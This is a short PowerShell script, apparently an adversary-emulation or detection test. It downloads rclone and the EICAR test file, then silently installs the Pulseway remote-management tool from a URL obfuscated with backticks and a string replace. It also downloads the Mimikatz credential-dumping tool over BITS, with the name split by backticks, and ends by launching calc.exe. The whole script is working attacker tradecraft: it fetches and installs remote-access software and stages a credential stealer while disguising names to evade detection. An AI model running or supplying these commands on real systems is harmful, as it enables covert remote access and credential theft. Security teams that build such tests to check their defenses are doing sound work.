Invoke-WebRequest "https://downloads.rclone.org/v1.74.4/rclone-v1.74.4-windows-amd64.zip" -OutFile "$env:TEMP\rclone.zip"
Expand-Archive -Path "$env:TEMP\rclone.zip" -DestinationPath "$env:TEMP\rclone" -Force
$rclone = Get-ChildItem "$env:TEMP\rclone" -Filter "rclone.exe" -Recurse | Select-Object -ExpandProperty FullName -First 1
& $rclone copyurl "https://secure.eicar.org/eicar.com.txt" "$env:TEMP\eicar.com.txt"

$url = "https://ssstring.us-east-1`.ama`zonaws.com/website/downloads/P`u`l`s`eway_`x64`.msi"
$url = $url.Replace("ssstring", "pulseway.s3")
Invoke-WebRequest $url -OutFile "$env:TEMP\j3xyz7.msi"
if (Test-Path "$env:TEMP\j3xyz7.msi") {
    msiexec.exe /i "$env:TEMP\j3xyz7.msi" /qn /norestart /L*v "$env:TEMP\j3xyz7-install.log"
}

$url2 = "https://github.com/gentilkiwi/mimi`katz/releases/download/2.2.0-20220919/mimi`katz_trunk.zip"
Start-BitsTransfer -source $url2 -destination "$env:TEMP\mimi.zip"
Expand-Archive -Path "$env:TEMP\mimi.zip" -DestinationPath "$env:TEMP\mimi" -Force

Start-Process "C:\Windows\System32\calc.exe"
